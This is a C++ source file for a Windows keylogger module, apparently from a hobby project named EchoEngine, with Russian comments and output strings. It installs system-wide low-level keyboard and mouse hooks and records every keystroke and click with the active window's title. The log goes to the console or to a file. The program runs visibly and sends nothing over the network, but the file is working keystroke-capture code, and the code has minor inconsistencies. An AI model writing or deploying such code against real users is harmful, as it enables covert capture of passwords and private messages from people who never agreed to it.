//
// Created by ddeeaaddllyy on 03.01.2026.
//

#include "../../../include/EchoEngine/modules/keylogger/keylogger.h"

#include "../../../include/EchoEngine/utils/string_utils.h"
#include <iostream>
#include <ostream>
#include <fstream>
#include <sstream>
#include <chrono>
#include <thread>
#include <ctime>
#include <iomanip>

bool KeyLogger::s_captureEnabled = true;
bool KeyLogger::s_waitingForTrigger = true;
bool KeyLogger::s_outputToConsole = true;
std::string KeyLogger::s_outputFilename;
std::vector<std::string> KeyLogger::s_keyLogBuffer;
size_t KeyLogger::s_totalCaptured = 0;
HHOOK KeyLogger::s_keyboardHook = nullptr;
HHOOK KeyLogger::s_mouseHook = nullptr;
HWND KeyLogger::s_consoleHook = nullptr;
CRITICAL_SECTION KeyLogger::s_criticalSection;
bool KeyLogger::s_programRunning = true;
std::atomic<bool> g_requestOutput{false};
std::atomic<bool> g_requestExit{false};
DWORD KeyLogger::s_messageThreadId = 0;
size_t KeyLogger::s_flushThreshold = 50;

KeyLogger::KeyLogger() :
    m_running(false),
    m_initialized(false) {
    InitializeCriticalSection(&s_criticalSection);
    s_consoleWindow = GetConsoleWindow();
}

KeyLogger::~KeyLogger() {
    shutdown();
    DeleteCriticalSection(&s_criticalSection);
}

bool KeyLogger::initialize() {
    if (m_running) {
        return true;
    }

    SetConsoleCtrlHandler(consoleCtrlHandler, true);

    if (!installHooks()) {
        std::cerr << "installHooks failed" << std::endl;
        return false;
    }

    m_initialized = true;
    return true;
}

void KeyLogger::run() {
    if (!m_initialized) {
        if (!initialize()) return;
    }

    m_running = true;
    s_programRunning = true;

    s_messageThreadId = GetCurrentThreadId(); // ← ВАЖНО

    processMessageLoop();
}

void KeyLogger::shutdown() {
    if (!m_initialized) {
        return;
    }

    m_running = false;
    s_programRunning = false;
    uninstallHooks();

    if (!s_keyLogBuffer.empty()) {
        std::cout << "\n\n=== ФИНАЛЬНЫЙ ВЫВОД ===" << std::endl;
        printBufferedLog();
    }

    m_initialized = false;
    std::cout << "Программа завершена." << std::endl;
}

bool KeyLogger::installHooks() {
    s_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, nullptr, 0);

    if (!s_keyboardHook) {
        std::cerr << "SetWindowsHookEx keyboard failed: " << GetLastError() << std::endl;

        return false;
    }
    s_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, nullptr, 0);
    if (!s_mouseHook) {
        std::cerr << "SetWindowsHookEx mouse failed: " << GetLastError() << std::endl;

        UnhookWindowsHookEx(s_keyboardHook);
        return false;
    }

    return true;
}

void KeyLogger::uninstallHooks() {
    if (s_keyboardHook) {
        UnhookWindowsHookEx(s_keyboardHook);
        s_keyboardHook = nullptr;
    }
    if (s_mouseHook) {
        UnhookWindowsHookEx(s_mouseHook);
        s_mouseHook = nullptr;
    }
}

LRESULT CALLBACK KeyLogger::keyboardHookProc(
    int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && s_captureEnabled) {
        auto* p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            // Ctrl R -> выход
            if (p->vkCode == VK_RETURN) {
                g_requestOutput.store(true, std::memory_order_relaxed);
                PostThreadMessage(s_messageThreadId, WM_APP + 1, 0, 0);
            }

            if (p->vkCode == 'R' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
                g_requestExit.store(true, std::memory_order_relaxed);
                PostThreadMessage(s_messageThreadId, WM_QUIT, 0, 0);
            }


            // лог
            EnterCriticalSection(&s_criticalSection);
            s_keyLogBuffer.emplace_back(
                getActiveWindowTitle() + " | " +
                virtualKeyToString(p->vkCode)
            );
            LeaveCriticalSection(&s_criticalSection);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}


LRESULT CALLBACK KeyLogger::mouseHookProc(
    int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && s_captureEnabled) {
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {

            EnterCriticalSection(&s_criticalSection);
            s_keyLogBuffer.emplace_back(
                getActiveWindowTitle() +
                (wParam == WM_LBUTTONDOWN ? " | [ЛКМ]" : " | [ПКМ]")
            );
            LeaveCriticalSection(&s_criticalSection);

            g_requestOutput.store(true, std::memory_order_relaxed);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}


void KeyLogger::processMessageLoop()
{
    MSG msg;

    std::cout << "Программа запущена\n"
              << "Enter / клик — вывод\n"
              << "Ctrl+R — выход\n> ";

    while (GetMessage(&msg, nullptr, 0, 0)) {

        if (msg.message == WM_APP + 1) {
            if (g_requestOutput.exchange(false)) {
                triggerOutput();
            }
        }

        if (msg.message == WM_QUIT) {
            break;
        }

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    shutdown();
}


void KeyLogger::triggerOutput()
{
    std::cout << "\n\n=== ВЫВОД ЛОГА ===\n";
    printBufferedLog();
    std::cout << "\nОжидание следующего триггера...\n> ";
}

std::string KeyLogger::virtualKeyToString(const DWORD vkCode) {
    struct KeyMap {
        DWORD vkCode;
        const char* name;
    };

    static const KeyMap keyMap[] = {
        {VK_LBUTTON, "[ЛКМ]"},
        {VK_RBUTTON, "[ПКМ]"},
        {VK_BACK, "[Backspace]"},
        {VK_TAB, "[Tab]"},
        {VK_RETURN, "[Enter]"},
        {VK_SHIFT, "[Shift]"},
        {VK_CONTROL, "[Ctrl]"},
        {VK_MENU, "[Alt]"},
        {VK_CAPITAL, "[CapsLock]"},
        {VK_ESCAPE, "[Esc]"},
        {VK_SPACE, "[Space]"},
        {VK_PRIOR, "[PageUp]"},
        {VK_NEXT, "[PageDown]"},
        {VK_END, "[End]"},
        {VK_HOME, "[Home]"},
        {VK_LEFT, "[Left]"},
        {VK_UP, "[Up]"},
        {VK_RIGHT, "[Right]"},
        {VK_DOWN, "[Down]"},
        {VK_INSERT, "[Insert]"},
        {VK_DELETE, "[Delete]"},
        {VK_LWIN, "[Win]"},
        {VK_RWIN, "[Win]"},
        {0, nullptr}
    };

    for (int i = 0; keyMap[i].name != nullptr; i++) {
        if (keyMap[i].vkCode == vkCode) {
            return keyMap[i].name;
        }
    }

    if (vkCode >= 'A' && vkCode <= 'Z') {
        const bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        const bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        bool uppercase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
        char c = static_cast<char>(vkCode);
        if (!uppercase) {
            c = tolower(c);
        }
        return std::string(1, c);
    }

    if (vkCode >= '0' && vkCode <= '9') {
        return std::string(1, static_cast<char>(vkCode));
    }

    if (vkCode >= VK_F1 && vkCode <= VK_F24) {
        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    }

    return "[Key:" + std::to_string(vkCode) + "]";
}

std::string KeyLogger::getActiveWindowTitle() {
    HWND foreground = GetForegroundWindow();
    if (foreground == nullptr) return "[Нет окна]";

    wchar_t title[256];
    GetWindowTextW(foreground, title, _countof(title));

    if (wcslen(title) == 0) {
        return "[Без названия]";
    }

    return StringUtils::utf16_to_utf8(title);
}

void KeyLogger::saveLogToBuffer(const std::string& entry) {
    EnterCriticalSection(&s_criticalSection);
    s_keyLogBuffer.push_back(entry);
    s_totalCaptured++;
    LeaveCriticalSection(&s_criticalSection);
}

void KeyLogger::printBufferedLog() {
    if (s_keyLogBuffer.empty()) {
        std::cout << "\n[Буфер пуст]\n> ";
        return;
    }

    if (s_outputToConsole) {
        std::cout << "\n\n=== НАКОПЛЕННЫЙ ЛОГ (" << s_keyLogBuffer.size() << " записей) ===" << std::endl;

        EnterCriticalSection(&s_criticalSection);
        for (const auto& entry : s_keyLogBuffer) {
            std::cout << entry << std::endl;
        }
        LeaveCriticalSection(&s_criticalSection);

        std::cout << "=== КОНЕЦ ЛОГА ===" << std::endl;
        std::cout << "> ";
    }
    if (!s_outputFilename.empty()) {
        std::ofstream file(s_outputFilename, std::ios::app);

        if (file.is_open()) {
            const auto now = std::chrono::system_clock::now();
            const auto now_time = std::chrono::system_clock::to_time_t(now);
            file << "\n=== Вывод от " << std::put_time(std::localtime(&now_time), "%Y-%m-%d %H:%M:%S") << " ===" << std::endl;
            EnterCriticalSection(&s_criticalSection);
            for (const auto& entry : s_keyLogBuffer) {
                file << entry << std::endl;
            }
            file << "=== Всего записей: " << s_keyLogBuffer.size() << " ===" << std::endl;
            LeaveCriticalSection(&s_criticalSection);

            file.close();
            std::cout << "[Лог сохранен в файл: " << s_outputFilename << "]" << std::endl;
        }
    }
    EnterCriticalSection(&s_criticalSection);
    s_keyLogBuffer.clear();
    LeaveCriticalSection(&s_criticalSection);
}

BOOL WINAPI KeyLogger::consoleCtrlHandler(const DWORD eventType) {
    switch (eventType) {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
            std::cout << "\nПолучен сигнал завершения..." << std::endl;
            s_programRunning = false;
            return TRUE;
        default:
            return FALSE;
    }
}

void KeyLogger::setOutputToConsole(const bool enable) {
    s_outputToConsole = enable;
}

void KeyLogger::setOutputToFile(const std::string& filename) {
    s_outputFilename = filename;
    
    if (!filename.empty()) {
        std::ofstream file(filename, std::ios::trunc);

        if (file.is_open()) {
            const auto now = std::chrono::system_clock::now();
            const auto now_time = std::chrono::system_clock::to_time_t(now);
            file << "=== Лог перехвата клавиш ===" << std::endl;
            file << "Начало: " << std::ctime(&now_time) << std::endl;
            file.close();
        }
    }
}

void KeyLogger::setCaptureEnabled(bool enabled) {
    s_captureEnabled = enabled;
}

bool KeyLogger::isRunning() const {
    return m_running;
}

size_t KeyLogger::getCapturedCount() {
    return s_totalCaptured;
}